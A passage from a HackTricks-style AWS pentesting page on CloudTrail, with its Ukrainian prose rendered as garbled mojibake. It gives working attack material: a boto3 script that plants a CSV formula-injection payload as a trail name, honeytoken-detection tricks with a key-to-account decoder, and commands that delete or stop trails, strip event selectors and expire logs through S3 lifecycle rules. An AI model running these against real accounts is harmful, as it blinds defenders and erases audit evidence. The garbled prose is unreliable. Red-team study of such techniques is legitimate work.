–¥–æ—Å—Ç—É–ø –≤—ñ–¥–±—É–≤–∞–≤—Å—è. –¶–µ –¥–æ–ø–æ–º–∞–≥–∞—î –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º AWS –ø—Ä–∏–π–º–∞—Ç–∏ –æ–±“ë—Ä—É–Ω—Ç–æ–≤–∞–Ω—ñ —Ä—ñ—à–µ–Ω–Ω—è —â–æ–¥–æ **–≤–¥–æ—Å–∫–æ–Ω–∞–ª–µ–Ω–Ω—è –¥–æ–∑–≤–æ–ª—ñ–≤**, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∏ –º–æ–∂—É—Ç—å –≤–∏–∑–Ω–∞—á–∏—Ç–∏ –ø–æ—Å–ª—É–≥–∏, —è–∫—ñ –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∏—Å—è –ø—Ä–æ—Ç—è–≥–æ–º —Ç—Ä–∏–≤–∞–ª–æ–≥–æ —á–∞—Å—É —Ç–∞, –º–æ–∂–ª–∏–≤–æ, —Å–∫–æ—Ä–æ—Ç–∏—Ç–∏ –∑–∞–Ω–∞–¥—Ç–æ —à–∏—Ä–æ–∫—ñ –¥–æ–∑–≤–æ–ª–∏ –Ω–∞ –æ—Å–Ω–æ–≤—ñ —Ä–µ–∞–ª—å–Ω–∏—Ö —à–∞–±–ª–æ–Ω—ñ–≤ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è.

{% hint style="success" %}
–û—Ç–∂–µ, –∫–æ–Ω—Å—É–ª—å—Ç–∞–Ω—Ç –∑ –¥–æ—Å—Ç—É–ø—É –ø–æ–≤—ñ–¥–æ–º–ª—è—î –ø—Ä–æ **–Ω–µ–ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥–æ–∑–≤–æ–ª–∏, —è–∫—ñ –Ω–∞–¥–∞—é—Ç—å—Å—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º**, —â–æ–± –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä –º—ñ–≥ —ó—Ö –≤–∏–¥–∞–ª–∏—Ç–∏
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## –î—ñ—ó

### –ü–µ—Ä–µ–ª—ñ–∫
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **–í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è CSV**

–ú–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è CVS –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ CloudTrail, —è–∫–µ –≤–∏–∫–æ–Ω–∞—î –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥, —è–∫—â–æ –∂—É—Ä–Ω–∞–ª–∏ –µ–∫—Å–ø–æ—Ä—Ç—É—é—Ç—å—Å—è —É —Ñ–æ—Ä–º–∞—Ç—ñ CSV —Ç–∞ –≤—ñ–¥–∫—Ä–∏–≤–∞—é—Ç—å—Å—è –≤ Excel.\
–ù–∞—Å—Ç—É–ø–Ω–∏–π –∫–æ–¥ —Å—Ç–≤–æ—Ä–∏—Ç—å –∑–∞–ø–∏—Å –∂—É—Ä–Ω–∞–ª—É –∑ –ø–æ–≥–∞–Ω–æ—é –Ω–∞–∑–≤–æ—é –º–∞—Ä—à—Ä—É—Ç—É, —â–æ –º—ñ—Å—Ç–∏—Ç—å –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ CSV-—ñ–Ω'—î–∫—Ü—ñ–π –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Å—Ç–æ—Ä—ñ–Ω–∫—É:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ü—é –∫–æ–Ω–∫—Ä–µ—Ç–Ω—É —Ç–µ—Ö–Ω—ñ–∫—É –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **–û–±—Ö—ñ–¥ –≤–∏—è–≤–ª–µ–Ω–Ω—è**

### –û–±—Ö—ñ–¥ HoneyTokens

HoneyTokens —Å—Ç–≤–æ—Ä–µ–Ω—ñ –¥–ª—è **–≤–∏—è–≤–ª–µ–Ω–Ω—è –≤–∏—Ç–æ–∫—É —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó**. –£ –≤–∏–ø–∞–¥–∫—É AWS, —Ü–µ **–∫–ª—é—á—ñ AWS, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —è–∫–∏—Ö –º–æ–Ω—ñ—Ç–æ—Ä–∏—Ç—å—Å—è**, —è–∫—â–æ —â–æ—Å—å —Å–ø—Ä–∏—á–∏–Ω—è—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥—ñ—ó –∑ —Ü–∏–º –∫–ª—é—á–µ–º, —Ç–æ —Ö—Ç–æ—Å—å –ø–æ–≤–∏–Ω–µ–Ω –±—É–≤ –≤–∫—Ä–∞—Å—Ç–∏ —Ü–µ–π –∫–ª—é—á.

–û–¥–Ω–∞–∫ —Ü—è –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ **CloudTrail**, —ñ —î –¥–µ—è–∫—ñ **AWS-—Å–µ—Ä–≤—ñ—Å–∏, —è–∫—ñ –Ω–µ –Ω–∞–¥—Å–∏–ª–∞—é—Ç—å –∂—É—Ä–Ω–∞–ª–∏ –≤ CloudTrail** (–¥–∏–≤. [—Å–ø–∏—Å–æ–∫ —Ç—É—Ç](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). –î–µ—è–∫—ñ –∑ —Ü–∏—Ö —Å–µ—Ä–≤—ñ—Å—ñ–≤ –±—É–¥—É—Ç—å **–≤—ñ–¥–ø–æ–≤—ñ–¥–∞—Ç–∏** –ø–æ–º–∏–ª–∫–æ—é, —â–æ –º—ñ—Å—Ç–∏—Ç—å **ARN —Ä–æ–ª—ñ –∫–ª—é—á–∞**, —è–∫—â–æ —Ö—Ç–æ—Å—å –Ω–µ—É–ø–æ–≤–Ω–æ–≤–∞–∂–µ–Ω–∏–π (–∫–ª—é—á honeytoken) –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ –Ω—å–æ–≥–æ –¥–æ—Å—Ç—É–ø.

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ ARN –∫–ª—é—á–∞ –±–µ–∑ —Å–ø—Ä–∏—á–∏–Ω–µ–Ω–Ω—è –∂–æ–¥–Ω–æ–≥–æ –∂—É—Ä–Ω–∞–ª—É**. –£ ARN –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –ø–æ–±–∞—á–∏—Ç–∏ **—ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É AWS —Ç–∞ –Ω–∞–∑–≤—É**, –ª–µ–≥–∫–æ –≤–∏–∑–Ω–∞—á–∏—Ç–∏ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∏ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –∫–æ–º–ø–∞–Ω—ñ–π HoneyToken, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–∏–∑–Ω–∞—á–∏—Ç–∏, —á–∏ –∫–ª—é—á —î HoneyToken.

![](<../../../../.gitbook/assets/image (65).png>)

#### **–í–∏—è–≤–ª–µ–Ω–Ω—è HoneyTokens**

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) –≤–∏—è–≤–ª—è—î, —á–∏ –∫–ª—é—á –Ω–∞–ª–µ–∂–∏—Ç—å [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* –Ø–∫—â–æ **`canarytokens.org`** –∑'—è–≤–ª—è—î—Ç—å—Å—è —É –Ω–∞–∑–≤—ñ —Ä–æ–ª—ñ –∞–±–æ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä—ñ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É **`534261010715`** –∑'—è–≤–ª—è—î—Ç—å—Å—è —É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—ñ –ø—Ä–æ –ø–æ–º–∏–ª–∫—É.
* –ü—ñ–¥ —á–∞—Å –æ—Å—Ç–∞–Ω–Ω—ñ—Ö —Ç–µ—Å—Ç—ñ–≤ –≤–æ–Ω–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å **`717712589309`** —ñ –≤—Å–µ —â–µ –º–∞—é—Ç—å —Ä—è–¥–æ–∫ **`canarytokens.com`** —É –Ω–∞–∑–≤—ñ.
* –Ø–∫—â–æ **`SpaceCrab`** –∑'—è–≤–ª—è—î—Ç—å—Å—è —É –Ω–∞–∑–≤—ñ —Ä–æ–ª—ñ —É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—ñ –ø—Ä–æ –ø–æ–º–∏–ª–∫—É.
* **SpaceSiren** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **uuids** –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó —ñ–º–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* –Ø–∫—â–æ **–Ω–∞–∑–≤–∞ –≤–∏–≥–ª—è–¥–∞—î —è–∫ –≤–∏–ø–∞–¥–∫–æ–≤–æ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∞**, —î –≤–µ–ª–∏–∫—ñ –π–º–æ–≤—ñ—Ä–Ω–æ—Å—Ç—ñ —Ç–æ–≥–æ, —â–æ —Ü–µ HoneyToken.

{% hint style="danger" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤—Å—ñ –≤–∏—è–≤–ª–µ–Ω—ñ –≥—Ä–æ–º–∞–¥—Å—å–∫—ñ API, —è–∫—ñ –Ω–µ —Å—Ç–≤–æ—Ä—é—é—Ç—å –∂—É—Ä–Ω–∞–ª–∏ CloudTrail, –∑–∞—Ä–∞–∑ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω—ñ, —Ç–æ–º—É –º–æ–∂–ª–∏–≤–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞–π—Ç–∏ —Å–≤–æ—ó –≤–ª–∞—Å–Ω—ñ...

–ê–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ **—ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É** –∑ **–∑–∞–∫–æ–¥–æ–≤–∞–Ω–∏–º** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **–∫–ª—é—á–∞ –¥–æ—Å—Ç—É–ø—É**, —è–∫ [**–ø–æ—è—Å–Ω–µ–Ω–æ —Ç—É—Ç**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) —ñ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∑—ñ —Å–≤–æ—ó–º —Å–ø–∏—Å–∫–æ–º –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ Honeytokens AWS:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print ("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
{% endhint %}

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–µ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).

### –î–æ—Å—Ç—É–ø –¥–æ —Ç—Ä–µ—Ç—å–æ—ó —ñ–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–∏

–î–µ—è–∫—ñ —Å–ª—É–∂–±–∏ AWS –±—É–¥—É—Ç—å **—Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –¥–µ—è–∫—É —ñ–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—É**, —Ç–∞–∫—É —è–∫ **–±–∞–∑–∏ –¥–∞–Ω–∏—Ö** –∞–±–æ **–∫–ª–∞—Å—Ç–µ—Ä–∏ Kubernetes** (EKS). –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á, **—è–∫–∏–π –ø—Ä–∞—Ü—é—î –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –∑ —Ü–∏–º–∏ —Å–ª—É–∂–±–∞–º–∏** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑ API Kubernetes), **–Ω–µ –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ API AWS**, —Ç–æ–º—É CloudTrail –Ω–µ –∑–º–æ–∂–µ –±–∞—á–∏—Ç–∏ —Ü—é –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—é.

–û—Ç–∂–µ, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∑ –¥–æ—Å—Ç—É–ø–æ–º –¥–æ EKS, —è–∫–∏–π –≤–∏—è–≤–∏–≤ URL API EKS, –º–æ–∂–µ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ —Ç–æ–∫–µ–Ω –ª–æ–∫–∞–ª—å–Ω–æ —Ç–∞ **—Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ API-—Å–µ—Ä–≤—ñ—Å–æ–º –±–µ–∑ –≤–∏—è–≤–ª–µ–Ω–Ω—è Cloudtrail**.

–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### –ó–º—ñ–Ω–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó CloudTrail

#### –í–∏–¥–∞–ª–µ–Ω–Ω—è —Ç—Ä–∞—Å
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### –ó—É–ø–∏–Ω–∏—Ç–∏ —Ç—Ä–∞—Å–∏
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### –í–∏–º–∫–Ω–µ–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—é–≤–∞–Ω–Ω—è –≤ –¥–µ–∫—ñ–ª—å–∫–æ—Ö —Ä–µ–≥—ñ–æ–Ω–∞—Ö

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### –í–∏–º–∫–Ω–µ–Ω–Ω—è –≤–µ–¥–µ–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–µ–ª–µ–∫—Ç–æ—Ä—ñ–≤ –ø–æ–¥—ñ–π

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

–£ –ø–µ—Ä—à–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –Ω–∞–¥–∞—î—Ç—å—Å—è –æ–¥–∏–Ω —Å–µ–ª–µ–∫—Ç–æ—Ä –ø–æ–¥—ñ–π —É –≤–∏–≥–ª—è–¥—ñ –º–∞—Å–∏–≤—É JSON –∑ –æ–¥–Ω–∏–º –æ–±'—î–∫—Ç–æ–º. `"ReadWriteType": "ReadOnly"` –≤–∫–∞–∑—É—î, —â–æ **—Å–µ–ª–µ–∫—Ç–æ—Ä –ø–æ–¥—ñ–π –ø–æ–≤–∏–Ω–µ–Ω –∑–∞—Ö–æ–ø–ª—é–≤–∞—Ç–∏ –ª–∏—à–µ –ø–æ–¥—ñ—ó —Ç—ñ–ª—å–∫–∏ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è** (—Ç–∞–∫–∏–º —á–∏–Ω–æ–º, CloudTrail insights **–Ω–µ –±—É–¥–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ –ø–æ–¥—ñ—ó –∑–∞–ø–∏—Å—É**, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥).

–í–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —Å–µ–ª–µ–∫—Ç–æ—Ä –ø–æ–¥—ñ–π –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –¥–æ –≤–∞—à–∏—Ö –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –≤–∏–º–æ–≥.

#### –í–∏–¥–∞–ª–µ–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–æ–ª—ñ—Ç–∏–∫–∏ –∂–∏—Ç—Ç—î–≤–æ–≥–æ —Ü–∏–∫–ª—É S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
### –ó–º—ñ–Ω–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –≤—ñ–¥–∂–µ—Ç–∞

* –í–∏–¥–∞–ª–∏—Ç–∏ –≤—ñ–¥–∂–µ—Ç S3
* –ó–º—ñ–Ω–∏—Ç–∏ –ø–æ–ª—ñ—Ç–∏–∫—É –≤—ñ–¥–∂–µ—Ç–∞, —â–æ–± –∑–∞–±–æ—Ä–æ–Ω–∏—Ç–∏ –±—É–¥—å-—è–∫—ñ –∑–∞–ø–∏—Å–∏ –≤—ñ–¥ —Å–ª—É–∂–±–∏ CloudTrail
* –î–æ–¥–∞—Ç–∏ –ø–æ–ª—ñ—Ç–∏–∫—É –∂–∏—Ç—Ç—î–≤–æ–≥–æ —Ü–∏–∫–ª—É –¥–æ –≤—ñ–¥–∂–µ—Ç–∞ S3 –¥–ª—è –≤–∏–¥–∞–ª–µ–Ω–Ω—è –æ–±'—î–∫—Ç—ñ–≤
* –í–∏–º–∫–Ω—É—Ç–∏ –∫–ª—é—á kms, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ CloudTrail

### –í–∏–º–∞–≥–∞–Ω–Ω—è Cloudtrail

#### –í–∏–º–∞–≥–∞–Ω–Ω—è S3

–í–∏ –º–æ–∂–µ—Ç–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –∞—Å–∏–º–µ—Ç—Ä–∏—á–Ω–∏–π –∫–ª—é—á** —ñ –∑—Ä–æ–±–∏—Ç–∏ **CloudTrail —à–∏—Ñ—Ä—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ü—å–æ–≥–æ –∫–ª—é—á–∞ —Ç–∞ **–≤–∏–¥–∞–ª–∏—Ç–∏ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á**, —â–æ–± –≤–º—ñ—Å—Ç CloudTrail –Ω–µ –º—ñ–≥ –±—É—Ç–∏ –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–∏–π.\
–¶–µ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É **S3-KMS –≤–∏–º–∞–≥–∞–Ω–Ω—è**, –ø–æ—è—Å–Ω–µ–Ω–µ –≤:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS –≤–∏–º–∞–≥–∞–Ω–Ω—è**

–¶–µ –Ω–∞–π–ø—Ä–æ—Å—Ç—ñ—à–∏–π —Å–ø–æ—Å—ñ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ –ø–æ–ø–µ—Ä–µ–¥–Ω—é –∞—Ç–∞–∫—É –∑ —Ä—ñ–∑–Ω–∏–º–∏ –≤–∏–º–æ–≥–∞–º–∏ –¥–æ –¥–æ–∑–≤–æ–ª—ñ–≤:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **–ü–æ—Å–∏–ª–∞–Ω–Ω—è**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Å–≤–æ—é **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
